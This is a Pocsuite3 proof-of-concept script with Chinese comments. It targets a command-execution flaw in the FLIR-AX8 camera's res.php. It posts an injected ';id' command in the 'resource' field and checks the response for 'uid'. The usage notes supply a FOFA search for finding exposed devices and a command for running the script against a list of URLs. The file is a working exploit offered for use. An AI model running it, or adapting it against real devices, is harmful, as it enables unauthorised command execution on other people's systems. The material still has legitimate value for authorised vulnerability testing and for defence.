from collections import OrderedDict
from pocsuite3.api import (
    Output,
    POCBase,
    POC_CATEGORY,
    register_poc,
    requests,
    VUL_TYPE,
    get_listener_ip,
    get_listener_port,
)
from pocsuite3.lib.core.interpreter_option import (
    OptString,
    OptDict,
    OptIP,
    OptPort,
    OptBool,
    OptInteger,
    OptFloat,
    OptItems,
)
from pocsuite3.modules.listener import REVERSE_PAYLOAD


class DemoPOC(POCBase):
    vulID = "0"  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "1"  # 默认为1
    author = "mlxml"  # PoC作者的大名
    vulDate = "2022-10-11"  # 漏洞公开的时间,不知道就写今天
    createDate = "2022-10-11"  # 编写 PoC 的日期
    updateDate = "2022-10-11"  # PoC 更新的时间,默认和编写时间一样
    references = ["https://www.flir.cn/products/ax8-automation/"]  # 漏洞地址来源,0day不用写
    name = "FLIR-AX8后台命令执行PoC"  # PoC 名称
    appPowerLink = "https://www.flir.cn/products/ax8-automation/"  # 漏洞厂商主页地址
    appName = "FLIR-AX8"  # 漏洞应用名称
    appVersion = "every"  # 漏洞影响版本
    vulType = VUL_TYPE.UNAUTHORIZED_ACCESS  # 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    samples = []  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """
            FLIR-AX8 res.php 文件存在后台命令执行漏洞，攻击者通过默认口令登录后台后获取服务器权限。
        """  # 漏洞简要描述
    pocDesc = """
            fofa：app="FLIR-FLIR-AX8"
            pocsuite -r FLIR-AX8后台命令执行.py -f url.txt
        """  # POC用法描述

    def _check(self):
        # 漏洞验证代码
        result = []
        session = requests.session()
        headers = {"Accept-Encoding": "gzip, deflate",
                         "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6,zh-TW;q=0.5",
                         "Connection": "close", "Content-Type": "application/x-www-form-urlencoded"}
        data = {"action": "node", "resource": ";id"}
        cookie = session.cookies
        try:
            full_url = self.url.strip() + '/res.php'
            response = session.post(full_url,headers=headers, data=data, cookies=cookie,timeout=5,verify=False)
            if "uid" in response.text:
                result.append(full_url)
        except Exception as e:
             print(e)
        finally:
            return result

    def _verify(self):
        # 验证模式 , 调用检查代码 ,
        result = {}
        res = self._check()  # res就是返回的结果列表
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = self.name
            result['VerifyInfo']['vul_url'] = self.url
            result['VerifyInfo']['vul_detail'] = self.desc
        return self.parse_verify(result)

    def _attack(self):
        # 攻击模式 , 就是在调用验证模式
        return self._verify()

    def parse_verify(self, result):
        # 解析认证 , 输出
        output = Output(self)
        # 根据result的bool值判断是否有漏洞
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output

def other_fuc():
    pass


def other_utils_func():
    pass


# 注册 DemoPOC 类
register_poc(DemoPOC)
